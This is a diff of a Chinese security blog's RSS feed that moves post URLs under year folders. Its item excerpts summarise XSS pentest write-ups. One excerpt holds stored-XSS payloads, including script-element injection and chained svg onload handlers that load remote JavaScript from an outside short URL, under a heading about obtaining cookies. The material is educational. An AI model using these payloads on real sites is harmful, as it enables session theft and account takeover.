@@ -13,10 +13,10 @@
     
     <item>
       <title>记一次渗透测试中利用存储型XSS添加用户</title>
-      <link>http://wyb0.com/posts/recording-an-xss-in-pentest/</link>
+      <link>http://wyb0.com/posts/2018/recording-an-xss-in-pentest/</link>
       <pubDate>Wed, 14 Nov 2018 10:36:38 +0800</pubDate>
       
-      <guid>http://wyb0.com/posts/recording-an-xss-in-pentest/</guid>
+      <guid>http://wyb0.com/posts/2018/recording-an-xss-in-pentest/</guid>
       <description>0x00 简单查看 拿到目标后简单看了下，是一个类似员工管理的东西，用户可以创建group，其他用户可以搜索这个group然后申请加入
 每个账号都可以注册组织，然后让别人加入，加入的用户有创建者、管理员、默认成员3个角色，管理员拥有的权限就比较大了，可以查看通讯录、添加成员、删除成员等等
 0x01 申请加入组织流程分析 走了一遍流程，注册了两个账号，一个是reber，一个是yxk
@@ -36,10 +36,10 @@
     
     <item>
       <title>XSS中的编码</title>
-      <link>http://wyb0.com/posts/xss-encode/</link>
+      <link>http://wyb0.com/posts/2017/xss-encode/</link>
       <pubDate>Thu, 30 Mar 2017 15:25:37 +0800</pubDate>
       
-      <guid>http://wyb0.com/posts/xss-encode/</guid>
+      <guid>http://wyb0.com/posts/2017/xss-encode/</guid>
       <description>0x00 浏览器解析 浏览器收到服务器发来的HTML内容，会从头解析，遇到&amp;lt;script&amp;gt;&amp;lt;/script&amp;gt;时， 会调用js脚本解析器来解析并执行脚本，然后继续解析其他的HTML内容， 对于需要触发才能执行的事件，当事件触发时脚本解析器才会解析其中的脚本， 在这之前它是HTML的一部分  0x01 一些编码  URL编码
 %+字符的ASCII编码对应的两位十六进制，如&amp;quot;/&amp;quot;的url编码为&amp;quot;%2F&amp;quot;  HTML编码
  实体编码
@@ -54,10 +54,10 @@
     
     <item>
       <title>一次存储型XSS利用实例</title>
-      <link>http://wyb0.com/posts/recording-an-stored-xss/</link>
+      <link>http://wyb0.com/posts/2016/recording-an-stored-xss/</link>
       <pubDate>Sun, 17 Jul 2016 23:30:54 +0800</pubDate>
       
-      <guid>http://wyb0.com/posts/recording-an-stored-xss/</guid>
+      <guid>http://wyb0.com/posts/2016/recording-an-stored-xss/</guid>
       <description> 首先感谢凯神的指导
 0x00 注册账号 先得到一个临时邮箱，然后注册账号 0x01 找输入输出点 0x02 尝试构造payload payload用如下的即可：
 &amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt; &amp;quot;&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&amp;lt;a  但是这个要在点击删除时payload才起作用 也可用&amp;lt;img src=1 onerror=alert(1) /&amp;gt;自动加载，但也要点击删除按钮才能起作用 但是我们若想充分利用则需要远程加载自己的js  0x03 加载自己的js  此时的限制条件为：  * 30个字符 * script标签不能自己触发   只能构造类似下面的语句自己加载脚本：  a=document.createElement(&#39;script&#39;); a.src=&amp;quot;www.xxx.com&amp;quot;; document.head.appendChild(a);   可以用如下方法分割，多次添加：  a=document.createE/* */lement(&#39;script&#39;);/* */a.src=&amp;quot;www.xxx.com&amp;quot;;/* */document.head.app/* */endChild(a); 但此处不可行，考虑直接用JQuery等的函数getScript(URL)直接加载url，然而此处依然不行   查找  构造payload   使用如下payload： &amp;lt;svg/onload=&amp;quot;b=&#39;http://t.i&#39;&amp;quot;&amp;gt; &amp;lt;svg/onload=&amp;quot;b+=&#39;m/16ap6&#39;&amp;quot;&amp;gt; &amp;lt;svg/onload=&amp;quot;$loadJs(b)&amp;quot;&amp;gt;  0x04 得到Cookie </description>
@@ -65,10 +65,10 @@
     
     <item>
       <title>XSS漏洞及其挖掘方法</title>
-      <link>http://wyb0.com/posts/xss-basis-and-use/</link>
+      <link>http://wyb0.com/posts/2016/xss-basis-and-use/</link>
       <pubDate>Fri, 15 Jul 2016 10:30:54 +0800</pubDate>
       
-      <guid>http://wyb0.com/posts/xss-basis-and-use/</guid>
+      <guid>http://wyb0.com/posts/2016/xss-basis-and-use/</guid>
       <description>0x00 简介 XSS(跨站脚本攻击)是指攻击者在网页中嵌入客户端脚本，通常是Javascript编写的恶意代码，当用户使用浏览器浏览被嵌入恶意代码的网页时，恶意代码将在用户的浏览器上被解析执行。重点在&amp;rdquo;脚本&amp;rdquo;这两个字上，脚本主要有两个：JavaScript和ActionScript。
 要想深入研究XSS，必须要精通JavaScript，JavaScript能做到什么效果，XSS的威力就有多强大。
 0x01 危害 JavaScript可以用来获取用户Cookie、改变页面内容、URL转跳，那么存在XSS漏洞的网站，就可以盗取用户Cookie、黑掉页面、导航到恶意网站，而攻击者仅仅需要向页面中注入JavaScript代码。
